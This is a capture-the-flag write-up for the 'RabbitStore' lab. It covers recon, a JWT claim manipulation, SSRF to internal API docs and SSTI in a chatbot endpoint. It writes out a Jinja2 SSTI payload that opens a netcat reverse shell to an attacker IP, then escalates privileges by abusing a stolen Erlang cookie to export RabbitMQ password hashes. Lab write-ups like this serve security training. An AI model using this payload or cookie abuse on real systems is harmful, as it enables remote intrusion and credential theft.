# RabbitStore
Demonstrate your web application testing skills and the basics of Linux to escalate your privileges.

## Recon
`nmap -A -T4 10.49.173.181` 

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3f:da:55:0b:b3:a9:3b:09:5f:b1:db:53:5e:0b:ef:e2 (ECDSA)
|_  256 b7:d3:2e:a7:08:91:66:6b:30:d2:0c:f7:90:cf:9a:f4 (ED25519)

80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://cloudsite.thm/

4369/tcp  open  epmd    Erlang Port Mapper Daemon

25672/tcp open  unknown
```

## SSRF & Endpoint Enumeration
- Web app available for access at http://cloudsite.thm, signup page located on the subdomain `storage.cloudsite.thm`
- Created an account. A session json web token is associated with the user, and when decoded, there is a `subscription` with an active/inactive claim. 
- The JWT cannot be modified, however, `subscription:active` can be added as a claim to the JWT during interception of the registration process via proxy. This grants internal access to a webpage that allows secure file storage.

- Fuzzed for `/api` endpoints with `ffuf -u http://storage.cloudsite.thm/api/FUZZ -w /usr/share/wordlists/dirb/common.txt`, which showed a previously undiscovered endpoint: `/docs`

```
 :: Method           : GET
 :: URL              : http://storage.cloudsite.thm/api/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

docs                    [Status: 403, Size: 27, Words: 2, Lines: 1, Duration: 109ms]
login                   [Status: 405, Size: 36, Words: 4, Lines: 1, Duration: 119ms]
Login                   [Status: 405, Size: 36, Words: 4, Lines: 1, Duration: 119ms]
register                [Status: 405, Size: 36, Words: 4, Lines: 1, Duration: 110ms]
uploads                 [Status: 401, Size: 32, Words: 3, Lines: 1, Duration: 112ms]
```

- SSRF can be achieved via the the secure file storage endpoint, i.e. requesting for `http://127.0.0.1:80`. 
- In this case, Wappalyzer revealed the use of the `Express` web framework, which uses port 3000. Requesting `http://127.0.0.1:3000/docs` to fetch the internal api documentation worked. 

```
Endpoints Perfectly Completed

POST Requests:
/api/register - For registering user
/api/login - For loggin in the user
/api/upload - For uploading files
/api/store-url - For uploadion files via url
/api/fetch_messeges_from_chatbot - Currently, the chatbot is under development. Once development is complete, it will be used in the future.

GET Requests:
/api/uploads/filename - To view the uploaded files
/dashboard/inactive - Dashboard for inactive user
/dashboard/active - Dashboard for active user

Note: All requests to this endpoint are sent in JSON format.
```

## Initial Access via SSTI
- Sent empty POST data to the `/fetch_messeges_from_chatbot` endpoint with `curl -X POST http://storage.cloudsite.thm/api/fetch_messeges_from_chatbot --cookie "jwt=<jwt>" -H "Content-Type: application/json" -d '{"":""}'` 
- The response indicated that a username is required. When adding a valid username claim to the request, i.e. `{"username":"test@thm.com"}`, the api returns the following response: 

```
<!DOCTYPE html>
<html lang="en">
 <head>
   <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
       <title>Greeting</title>
 </head>
 <body>
   <h1>Sorry, test@thm.com, our chatbot server is currently under development.</h1>
 </body>
</html>
```

- This suggests that SSTI can be exploited, which can be performed using Python: `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc <ATTACKER_IP> <PORT> >/tmp/f').read() }}`
- User flag obtained. 


# Privilege Escalation 
- Performed user enumeration, which reveals the `rabbitmq` user for the RabbitMQ service on port 25672 with files stored at the path `/var/lib/rabbitmq`. 
- The Erlang cookie is stored in `/var/lib/rabbitmq/.erlang.cookie`. 
- RabbitMQ can be installed on the local machine with the command: `sudo apt install rabbitmq-server`. `forge` is then added to the /etc/hosts file for access

- RabbitMQ nodes use the format `rabbit@<hostname>, which can be accessed by: `sudo rabbitmqctl --erlang-cookie '<cookie>' --node rabbit@<hostname>`
- Further user enumeration can be done by entering `sudo rabbitmqctl --erlang-cookie <cookie> --node rabbit@<hostname> list_users`: 

```
Listing users ...
user    tags
The password for the root user is the SHA-256 hashed value of the RabbitMQ root user's password. Please don't attempt to crack SHA-256. []
root    [administrator]
```

- To export user data containing password hashes, a user can export definitions and save the data into a json file to the /tmp directory:
`sudo rabbitmqctl --erlang-cookie 'g7eIYIx8ylzT5BY6' --node rabbit@forge export_definitions /tmp/definitions.json`

- A randomly-generated 32-bit HEX salt is prepended to the SHA-256 encrypted password, wherein the entire string is encoded in base64. 
- Convert base64 hash to hex and remove the salt to extract the password hash; and switch to root.

- Root flag obtained.


